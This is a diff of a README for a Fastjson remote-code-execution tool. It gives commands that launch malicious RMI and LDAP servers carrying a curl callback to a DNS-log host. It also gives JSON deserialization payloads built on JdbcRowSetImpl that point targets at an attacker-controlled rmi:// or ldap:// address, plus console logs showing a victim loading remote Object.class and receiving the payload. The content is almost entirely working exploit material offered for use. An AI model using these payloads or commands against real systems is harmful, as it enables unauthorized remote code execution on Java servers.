@@ -1,7 +1,5 @@
 # fastjson_rce_tool
 
-![Image](https://xzfile.aliyuncs.com/xzvul/4afaaf0d31944b068e27afb45aae2556)
-
 ```
 1. RMI (need tomcat8)
 java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
@@ -96,8 +94,31 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 ===================================================================================================
 
-else:
-有些环境可能利用不成功，可以尝试默认的测试方法,
+[root@ /]# java -cp fastjson_tool.jar HRMIServer xx.xx.xx.xx 80 "curl dnslog.ff66ef.wyzxxz.cn"
+[-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}
+[-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}}
+[-] Opening JRMP listener on 80
+[-] Have connection from /xx.xx.xx.xx:33543
+[-] Reading message...
+[-] Is RMI.lookup call for Exploit 2
+[-] Sending remote classloading stub targeting http://xx.xx.xx.xx:80/Object.class
+[-] Closing connection
+[*] Have connection from /xx.xx.xx.xx:33544 /Object.class
+[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
+[-] send payload done and exit.
+
+
+[root@ /]# java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.ff66ef.wyzxxz.cn"
+[-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}
+[-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}}
+[-] LDAP Listening on 0.0.0.0:80
+[*] Send LDAP reference result for Exploit redirecting to http://xx.xx.xx.xx:80/Object.class
+[*] Have connection from /xx.xx.xx.xx:33548 /Object.class
+[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
+[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
+[-] send payload done and exit.
+
+
 
 
 
